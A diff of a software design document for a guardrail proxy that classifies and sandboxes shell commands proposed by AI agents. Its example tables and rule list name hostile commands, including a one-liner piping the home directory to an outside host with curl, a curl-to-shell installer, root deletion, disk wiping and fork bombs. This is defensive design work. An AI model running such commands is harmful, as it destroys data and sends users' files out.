@@ -1,66 +1,660 @@
-# Project Sentinel: Agentic Security Proxy
+# Project Sentinel: Software Design Document
 
-## 1. Project Overview
-Project Sentinel is a low-latency, AI-powered reverse proxy designed to secure autonomous computer-using agents (e.g., OpenClaw). It acts as an execution guardrail. Before an agent executes a system command, the command and context are intercepted by Sentinel. A locally-hosted PyTorch binary classifier evaluates the command for malicious or destructive intent. 
-*   If `score >= 0.8` (Dangerous): The command is blocked, returning a `403 Forbidden`.
-*   If `score < 0.8` (Safe): The command is executed within a sandboxed Docker container, returning `stdout`/`stderr`.
-*   Every interception is asynchronously logged to AWS DynamoDB for auditing.
+## 1. Executive Summary
 
-## 2. Tech Stack
-*   **ML Engine:** PyTorch (Fine-tuning Hugging Face `DistilBERT`), exported to ONNX for fast inference.
-*   **Proxy Server:** Python (FastAPI), Uvicorn, `asyncio`.
-*   **Containerization:** Docker (Multi-stage builds, non-root execution).
-*   **Cloud Infrastructure:** AWS (API Gateway, ECS/Fargate, DynamoDB, `boto3`).
+Project Sentinel is a backend security service for autonomous AI agents that can execute shell commands, Python snippets, AWS CLI calls, or other high-impact tool actions. Sentinel sits between the agent and the execution environment. Before a command runs, the agent sends Sentinel the user objective, agent context, proposed command, and target environment. Sentinel scores the request, applies policy rules, decides whether to allow, block, or require confirmation, executes approved commands inside a Docker sandbox, and logs every decision for auditing.
 
-## 3. Data Schema
-The PyTorch model requires a `jsonl` training dataset with the following strict schema:
+The project is not a website and does not require a full UI for v1. It is an API service that other programs call. The initial user is an agent framework or a test client. A small confirmation endpoint and optional API docs are enough for v1.
+
+The core value is not "AI magically knows what is bad." The core value is a layered guardrail:
+
+- A trained model estimates whether a command is risky relative to the stated context.
+- Deterministic policy rules catch obvious high-risk patterns.
+- Risk tiers separate safe actions, suspicious actions, and actions that need human confirmation.
+- Docker limits the blast radius of commands that are allowed to run.
+- AWS DynamoDB or a local fallback stores an audit trail for review.
+
+## 2. Goals and Non-Goals
+
+### 2.1 Goals
+
+- Build a working command-interception API for AI agents.
+- Train a PyTorch model that classifies `(context, command)` pairs by risk.
+- Serve the trained model through ONNX Runtime for fast, lightweight inference.
+- Combine model score, rules, and environment policy instead of relying on a single threshold.
+- Explicitly distinguish malicious behavior from authorized destructive behavior.
+- Run allowed commands inside a restricted Docker sandbox, not directly on the host.
+- Log all decisions to DynamoDB when AWS credentials are available, with a local fallback for development.
+- Produce measurable results: recall, false positive rate, latency, and sandbox behavior.
+- Provide a realistic demo using `curl`, a local Python agent simulator, and ideally OpenClaw.
+
+### 2.2 Non-Goals for v1
+
+- Guaranteeing perfect safety for all agents.
+- Running untrusted commands on production hosts.
+- Supporting every agent framework on day one.
+- Building a full web dashboard.
+- Running expensive always-on AWS infrastructure.
+- Replacing human approval for high-impact actions.
+- Building a general antivirus or endpoint detection product.
+
+## 3. Key Product Principle: Malicious vs. Destructive
+
+Sentinel must not treat every destructive command as malicious. Many legitimate maintenance tasks are destructive:
+
+- Cleaning build outputs.
+- Deleting temporary files.
+- Dropping a test database.
+- Reformatting a disposable sandbox.
+- Recreating infrastructure in a dev account.
+
+The central design rule:
+
+> A command is dangerous based on intent, scope, environment, and authorization, not just its text.
+
+### 3.1 Definitions
+
+- **Safe:** Low-risk command that matches the user's objective and has limited side effects.
+- **Destructive but authorized:** Command has meaningful side effects, but the user clearly requested it and the environment/scope is appropriate.
+- **Suspicious:** Command may be legitimate, but the context is vague, the scope is broad, or the command pattern often appears in attacks.
+- **Malicious or agent-gone-haywire:** Command conflicts with the user's objective, attempts exfiltration, privilege escalation, sabotage, credential theft, persistence, or broad destructive action without clear authorization.
+- **Unknown:** Sentinel cannot confidently decide and should fail closed or ask for confirmation depending on environment.
+
+### 3.2 Example Context Dependence
+
+| Context | Command | Expected Decision |
+| --- | --- | --- |
+| "Clean build artifacts for this repo" | `rm -rf ./dist ./build` | Allow in sandbox/dev |
+| "Summarize project files" | `rm -rf ./dist ./build` | Block or confirm |
+| "Delete this disposable test database" | `dropdb sentinel_test` | Confirm, then allow in sandbox/dev |
+| "Back up my home directory" | `tar czf - ~ | curl -X POST https://unknown.site --data-binary @-` | Block |
+| "List files" | `ls -la` | Allow |
+| "Install dependencies" | `curl https://unknown.site/install.sh | sh` | Confirm or block depending on policy |
+
+## 4. High-Level Architecture
+
+```text
+Agent or test client
+        |
+        | POST /execute
+        v
+Sentinel FastAPI service
+        |
+        | validate request
+        v
+Decision engine
+        |
+        |-- rules baseline
+        |-- ONNX model risk score
+        |-- environment policy
+        |-- confirmation state
+        v
+Verdict: allow / warn / confirm_required / block
+        |
+        | if allow
+        v
+Docker executor sandbox
+        |
+        | stdout, stderr, exit code, timeout
+        v
+Response to agent
+        |
+        v
+Audit log to DynamoDB or local fallback
+```
+
+## 5. Main Components
+
+### 5.1 Data Pipeline
+
+Purpose: Build reproducible training and evaluation datasets.
+
+Responsibilities:
+
+- Ingest public benchmark traces where possible, such as CUAHarm and OS-Harm.
+- Add hand-written and synthetic examples for context-dependent command risk.
+- Normalize each example into a common JSONL schema.
+- Split examples into train, validation, and test sets.
+- Track source and category for later error analysis.
+
+Important: Labels must reflect whether the command is appropriate for the context, not whether the command looks scary in isolation.
+
+### 5.2 PyTorch Training Pipeline
+
+Purpose: Train the risk model locally, using the available 3070 GPU.
+
+Responsibilities:
+
+- Load JSONL data.
+- Fine-tune a small text classifier such as DistilBERT.
+- Train on combined text such as:
+  - user objective
+  - agent context
+  - command
+  - environment
+- Optimize primarily for high recall on truly dangerous behavior while tracking false positives.
+- Save model artifacts.
+- Export the final model to ONNX for serving.
+
+PyTorch is used for training. The API server should prefer ONNX Runtime for production inference.
+
+### 5.3 Rules Baseline
+
+Purpose: Provide a deterministic safety floor.
+
+Rules should catch obvious high-risk patterns even if the model is uncertain:
+
+- `rm -rf /`
+- `mkfs`, `dd if=... of=/dev/...`
+- credential file reads followed by network upload
+- suspicious `curl | sh` or `wget | bash`
+- destructive AWS CLI commands against non-sandbox environments
+- privilege escalation patterns
+- fork bombs or resource exhaustion patterns
+- attempts to disable logging, delete audit files, or hide activity
+
+Rules must be scoped. For example, `rm -rf ./build` is different from `rm -rf /`.
+
+### 5.4 Decision Engine
+
+Purpose: Combine model score, rules, environment, and confirmation state into a final verdict.
+
+Inputs:
+
+- `context`
+- `command`
+- `environment`
+- `user_id` or session ID if available
+- `agent_id` if available
+- `user_confirmed`
+- model risk score
+- triggered rules
+
+Outputs:
+
+- `allow`
+- `warn`
+- `confirm_required`
+- `block`
+- reason codes
+
+The decision engine should be explainable. Each response should include a concise reason such as:
+
+- `rule:destructive-root-delete`
+- `model:high-risk-score`
+- `policy:production-requires-confirmation`
+- `confirmation:missing`
+- `environment:sandbox-allowed`
+
+### 5.5 Confirmation Flow
+
+Purpose: Handle cases where the agent may be doing something drastic but possibly intended.
+
+For v1, this can be API-based instead of a full UI.
+
+Possible flow:
+
+1. Agent sends a risky command to `POST /execute`.
+2. Sentinel returns `409 Conflict` or `202 Accepted` with `verdict: "confirm_required"` and a `confirmation_id`.
+3. A human or test script calls `POST /confirm` with that `confirmation_id`.
+4. Sentinel records the confirmation.
+5. Agent retries the command with the confirmation token or `user_confirmed: true`.
+6. Sentinel allows execution only if the command, context, and environment match the confirmed request.
+
+Confirmation should not be a generic bypass. It should be tied to the exact request or a stable request hash.
+
+### 5.6 Docker Executor
+
+Purpose: Run approved commands in an isolated environment.
+
+Sentinel should not run approved commands directly on the host. Instead, the API service should launch a separate Docker executor container with strict limits.
+
+Recommended restrictions:
+
+- non-root user
+- short timeout
+- memory limit
+- CPU limit
+- no network by default
+- restricted mounted workspace
+- no Docker socket inside the executor
+- read-only root filesystem where possible
+- clear cleanup after execution
+
+The executor returns:
+
+- `stdout`
+- `stderr`
+- `exit_code`
+- `timed_out`
+- `duration_ms`
+
+### 5.7 Audit Logger
+
+Purpose: Preserve a trace of every decision.
+
+Primary target: AWS DynamoDB.
+
+Fallback target: local JSONL log file for development without AWS credentials.
+
+Every request should be logged, including blocked and malformed requests when possible.
+
+### 5.8 Agent Integration
+
+Purpose: Prove Sentinel can sit between an agent and command execution.
+
+Primary stretch target: OpenClaw, if it exposes a command/tool execution hook.
+
+Fallback target: local agent simulator that sends proposed commands to Sentinel and follows allow/block/confirm responses.
+
+The fallback is acceptable for the portfolio because it proves the architecture without depending on OpenClaw internals.
+
+## 6. Technology Stack
+
+| Layer | Choice | Reason |
+| --- | --- | --- |
+| Training | Python, PyTorch, Hugging Face Transformers | Standard ML workflow for text classification |
+| Model | DistilBERT or similar small encoder | Fast enough for local training and CPU inference |
+| Inference | ONNX Runtime | Lighter production serving than full PyTorch |
+| API | FastAPI, Uvicorn | Common Python API stack, auto docs, typed request models |
+| Sandbox | Docker | Standard packaging and command isolation tool |
+| Logging | DynamoDB with local JSONL fallback | Real AWS experience without expensive hosting |
+| Deployment | Local Docker first; optional EC2; stretch ECS/Fargate + API Gateway | Avoids needing AWS credits for the core project |
+| Testing | pytest | Standard Python testing |
+
+## 7. API Design
+
+### 7.1 `POST /execute`
+
+Purpose: Evaluate and possibly execute a command.
+
+Request:
+
 ```json
 {
-  "context": "User prompt or agent objective string.",
-  "command": "The raw bash, Python, or AWS CLI command the agent intends to run.",
-  "label": 0 // 0 for Safe, 1 for Dangerous
+  "context": "Clean build artifacts for this repository.",
+  "command": "rm -rf ./dist ./build",
+  "environment": "sandbox",
+  "user_id": "local-user",
+  "agent_id": "openclaw-dev",
+  "user_confirmed": false,
+  "confirmation_token": null
 }
+```
 
-4. Required Scripts & Architecture Specs
-A. Data Engineering (data_pipeline.py)
-Input: Raw trace logs from 2026 agent safety benchmarks (e.g., CUAHarm, OS-Harm).
+Response when allowed:
 
-Execution: Extract system_prompt and tool_execution strings. Map tasks flagged as safety violations to label: 1, and benign operations to label: 0.
+```json
+{
+  "request_id": "uuid",
+  "verdict": "allow",
+  "risk_score": 0.18,
+  "risk_tier": "low",
+  "reasons": ["model:low-risk", "environment:sandbox"],
+  "execution": {
+    "stdout": "output...",
+    "stderr": "",
+    "exit_code": 0,
+    "timed_out": false,
+    "duration_ms": 142
+  }
+}
+```
 
-Synthetic Augmentation: Include an async function using the openai SDK to generate edge-case bash commands (obfuscated payloads vs. complex benign commands) using a strict system prompt.
+Response when blocked:
 
-B. Model Training (train_guardrail.py)
-Execution: Load the jsonl dataset via PyTorch DataLoader. Fine-tune a pre-trained DistilBERT sequence classifier for binary classification.
+```json
+{
+  "request_id": "uuid",
+  "verdict": "block",
+  "risk_score": 0.96,
+  "risk_tier": "critical",
+  "reasons": ["rule:destructive-root-delete", "policy:block-critical"],
+  "execution": null
+}
+```
 
-Optimization: Focus loss calculations on penalizing False Negatives.
+Response when confirmation is required:
 
-Output: Export the trained weights to an .onnx file for optimized production inference.
+```json
+{
+  "request_id": "uuid",
+  "verdict": "confirm_required",
+  "risk_score": 0.77,
+  "risk_tier": "high",
+  "confirmation_id": "uuid",
+  "reasons": ["model:high-risk", "policy:destructive-command-requires-confirmation"],
+  "execution": null
+}
+```
 
-C. Proxy API (main.py)
-Framework: FastAPI.
+### 7.2 `POST /confirm`
 
-Inference: Load the .onnx model into memory on startup.
+Purpose: Confirm a high-risk action before execution.
 
-Endpoint: POST /execute accepting {"context": str, "command": str}.
+Request:
 
-Routing Logic:
+```json
+{
+  "confirmation_id": "uuid",
+  "confirmed_by": "local-user",
+  "decision": "approve",
+  "note": "This is a disposable sandbox cleanup."
+}
+```
 
-Score the command.
+Response:
 
-If blocked, trigger background DynamoDB logging task and return 403.
+```json
+{
+  "confirmation_id": "uuid",
+  "status": "approved",
+  "confirmation_token": "signed-or-random-token"
+}
+```
 
-If allowed, execute the command using Python's subprocess.run with a strict timeout and captured streams. Trigger background DynamoDB logging task and return 200 with stdout.
+### 7.3 `GET /health`
 
-D. AWS Infrastructure (infra.py or CDK script)
-DynamoDB Table: sentinel_audit_logs.
+Purpose: Basic service health check.
 
-Partition Key: request_id (String - UUID)
+Response:
 
-Sort Key: timestamp (Number)
+```json
+{
+  "status": "ok",
+  "model_loaded": true,
+  "logger": "dynamodb"
+}
+```
 
-Attributes: command (String), inference_score (Number), verdict (String).
+## 8. Data Schema
 
-Compute: Specifications for an ECS Fargate task definition utilizing the Dockerfile.
+### 8.1 Training Example Schema
 
-E. Dockerfile
-Requirements: Must install PyTorch inference dependencies and FastAPI. Must create a dedicated sentinel non-root user. Must use a WORKDIR with restricted write permissions to ensure the shell execution layer is heavily sandboxed.
+```json
+{
+  "id": "example-001",
+  "context": "Clean build artifacts for this repository.",
+  "command": "rm -rf ./dist ./build",
+  "environment": "sandbox",
+  "label": 0,
+  "risk_category": "authorized_destructive",
+  "source": "synthetic",
+  "notes": "Destructive but scoped to build folders and aligned with context."
+}
+```
+
+Labels:
+
+- `0`: allowed or low-risk for the given context.
+- `1`: malicious, unauthorized, or unsafe for the given context.
+
+Recommended categories:
+
+- `safe_read_only`
+- `safe_build_or_install`
+- `authorized_destructive`
+- `ambiguous_requires_confirmation`
+- `data_exfiltration`
+- `credential_theft`
+- `privilege_escalation`
+- `system_destruction`
+- `network_abuse`
+- `defense_evasion`
+- `policy_violation`
+
+### 8.2 Audit Log Schema
+
+```json
+{
+  "request_id": "uuid",
+  "timestamp": 1760000000,
+  "user_id": "local-user",
+  "agent_id": "openclaw-dev",
+  "environment": "sandbox",
+  "context_summary": "Clean build artifacts...",
+  "command": "rm -rf ./dist ./build",
+  "risk_score": 0.18,
+  "risk_tier": "low",
+  "verdict": "allow",
+  "rules_triggered": [],
+  "confirmation_id": null,
+  "execution_exit_code": 0,
+  "execution_timed_out": false,
+  "duration_ms": 142
+}
+```
+
+## 9. Risk Tiers and Decision Policy
+
+The exact thresholds should be calibrated on validation data. Initial values are placeholders.
+
+| Tier | Example Score | Default Action | Notes |
+| --- | --- | --- | --- |
+| Low | 0.00-0.35 | Allow in sandbox/dev | Still log |
+| Medium | 0.35-0.65 | Allow in sandbox, warn in dev, confirm in production | Useful for ambiguous commands |
+| High | 0.65-0.85 | Confirm required | Destructive or suspicious but not automatically malicious |
+| Critical | 0.85-1.00 or critical rule | Block | Obvious exfiltration, root wipe, credential theft |
+
+Environment overrides:
+
+- `sandbox`: most forgiving, but still blocks critical rules.
+- `dev`: moderate; destructive commands often require confirmation.
+- `production`: strict; high-risk commands require confirmation, critical commands block.
+
+Confirmation overrides:
+
+- Confirmation may allow high-risk actions in sandbox/dev.
+- Confirmation should not allow critical blocked actions unless an explicit break-glass mode is added later.
+- Confirmation must be tied to the exact command/context/environment to prevent generic bypass.
+
+## 10. Edge Cases and Expected Behavior
+
+| Edge Case | Expected Behavior |
+| --- | --- |
+| User intentionally wants to delete a scoped folder | Confirm or allow if scoped and in sandbox/dev |
+| Agent unexpectedly deletes files during unrelated task | Block or require confirmation |
+| Command looks safe but exfiltrates data through network | Block if rule/model catches; no network in sandbox by default |
+| Command uses obfuscation or encoding | Model and rules should flag many cases; log misses for future data |
+| Model says safe but rule says critical | Critical rule wins |
+| Rule says suspicious but model says safe | Escalate to medium/high tier |
+| AWS logging fails | Return response if execution decision is complete, write local fallback log, expose warning |
+| Docker execution times out | Kill executor, return timeout, log event |
+| Executor image missing | Return service error, do not run on host |
+| OpenClaw integration unavailable | Use local agent simulator |
+| User confirmation token reused for different command | Reject |
+| Environment missing from request | Default to strict mode or reject request |
+| Command tries to access Docker socket | Block by policy and do not mount socket |
+
+## 11. Security Model
+
+### 11.1 Trust Boundaries
+
+- Agent input is untrusted.
+- Command text is untrusted.
+- User-provided context may be incomplete or misleading.
+- Model predictions are advisory, not absolute truth.
+- Docker sandbox reduces risk but is not treated as perfect isolation.
+- Audit logs should be append-only from the application's perspective.
+
+### 11.2 Safety Rules
+
+- Never run approved commands directly on the host in production mode.
+- Never mount the host root filesystem into the executor.
+- Never mount the Docker socket into the executor.
+- Default executor network to disabled.
+- Use timeouts for every command.
+- Use resource limits for every command.
+- Log blocked attempts.
+- Fail closed when the decision engine cannot decide safely.
+
+## 12. AWS and Deployment Plan
+
+### 12.1 No-Credits Path
+
+The project should not depend on AWS credits.
+
+Minimum AWS usage:
+
+- Run Sentinel locally in Docker.
+- Write audit logs to DynamoDB.
+- Use local JSONL fallback when AWS credentials are not configured.
+
+This still provides real AWS experience and keeps costs low.
+
+### 12.2 Optional Cloud Deployment
+
+If time and budget allow:
+
+- Deploy Sentinel on EC2 free tier running Docker.
+- Stretch: deploy to ECS/Fargate behind API Gateway for a short-lived demo.
+- Destroy expensive resources after testing.
+
+The architecture should support cloud deployment, but the core project must work locally.
+
+## 13. Repository Structure
+
+Planned structure:
+
+```text
+sentinel/
+  README.md
+  Draft Plan.md
+  Weekly Structure.md
+  data/
+    raw/
+    processed/
+    examples/
+  src/
+    sentinel/
+      api/
+        main.py
+        schemas.py
+      decision/
+        engine.py
+        rules.py
+        policy.py
+      model/
+        inference.py
+      execution/
+        docker_executor.py
+      logging/
+        audit.py
+        dynamodb_logger.py
+        local_logger.py
+      config.py
+  scripts/
+    data_pipeline.py
+    train_guardrail.py
+    export_onnx.py
+    evaluate_model.py
+  infra/
+    README.md
+  tests/
+    test_rules.py
+    test_policy.py
+    test_api.py
+    test_executor.py
+  Dockerfile
+  docker-compose.yml
+  pyproject.toml
+```
+
+## 14. Implementation Order
+
+1. Threat model and starter dataset.
+2. Data pipeline and train/eval split.
+3. Rules baseline and baseline metrics.
+4. First PyTorch classifier.
+5. ONNX export and inference wrapper.
+6. FastAPI `POST /execute` endpoint.
+7. Decision engine with risk tiers.
+8. Dockerized Sentinel service.
+9. Docker executor for approved commands.
+10. DynamoDB audit logging and local fallback.
+11. Deployment notes or optional EC2/Fargate demo.
+12. OpenClaw attempt or local agent simulator.
+13. Final evaluation, README, demo video, and resume bullet.
+
+## 15. Evaluation Plan
+
+### 15.1 Model Metrics
+
+- Recall on dangerous examples.
+- False positive rate on safe and authorized destructive examples.
+- Precision on dangerous predictions.
+- Confusion matrix by risk category.
+- Performance against rules-only baseline.
+
+### 15.2 System Metrics
+
+- p50/p99 model inference latency.
+- p50/p99 full API latency.
+- Docker sandbox execution overhead.
+- Timeout handling correctness.
+- Audit log success rate.
+
+### 15.3 Product Value Metrics
+
+- Number of dangerous commands blocked.
+- Number of authorized destructive commands correctly allowed or confirmed.
+- Number of false blocks on legitimate tasks.
+- Quality of reasons returned to the user or agent.
+
+## 16. Testing Strategy
+
+- Unit tests for rules.
+- Unit tests for policy decisions.
+- Unit tests for confirmation token behavior.
+- API tests for allowed, blocked, confirm-required, and malformed requests.
+- Executor tests for timeout, no-network behavior, and blocked host access.
+- Integration tests for request -> decision -> execution -> audit log.
+- Golden examples for context-dependent commands.
+
+## 17. OpenClaw Integration Plan
+
+OpenClaw integration is a stretch goal.
+
+Research questions:
+
+- Does OpenClaw expose a hook before command/tool execution?
+- Can the executor be replaced with an HTTP call to Sentinel?
+- Can Sentinel return output in the format OpenClaw expects?
+
+If yes:
+
+- Add an adapter that forwards proposed commands to `POST /execute`.
+- Run benign and malicious tasks through OpenClaw.
+- Use DynamoDB logs as proof of interception.
+
+If no:
+
+- Build a local agent simulator.
+- The simulator receives a task, proposes commands, sends them to Sentinel, and obeys allow/block/confirm responses.
+- This remains a valid end-to-end demonstration.
+
+## 18. Future Startup-Oriented Roadmap
+
+Potential features if Sentinel grows beyond a summer project:
+
+- Web dashboard for audit logs, command timelines, and blocked actions.
+- Human approval queue with Slack, email, or GitHub integration.
+- Organization-level policies and team roles.
+- Agent identity and per-agent permissions.
+- Integrations for MCP, LangChain, OpenClaw, AutoGen, Cursor tools, and CI agents.
+- Signed user intent so authorized destructive work can be distinguished from agent drift.
+- Policy templates for dev, staging, production, and cloud accounts.
+- SIEM integrations: CloudWatch, Datadog, Splunk, OpenTelemetry.
+- Continuous learning from reviewed audit logs.
+- Multi-tenant hosted version with private model deployment.
+- Enterprise deployment option for air-gapped or on-prem environments.
+
+## 19. Final Positioning
+
+Sentinel should be presented as:
+
+> A Dockerized FastAPI security proxy for AI agents that combines a PyTorch-trained command-risk model, deterministic policy rules, confirmation workflows, sandboxed execution, and AWS audit logging to reduce the risk of unsafe autonomous command execution.
+
+The honest claim:
+
+> Sentinel does not guarantee perfect safety. It provides measurable, layered risk reduction for agent command execution, with special attention to separating malicious behavior from authorized destructive work.
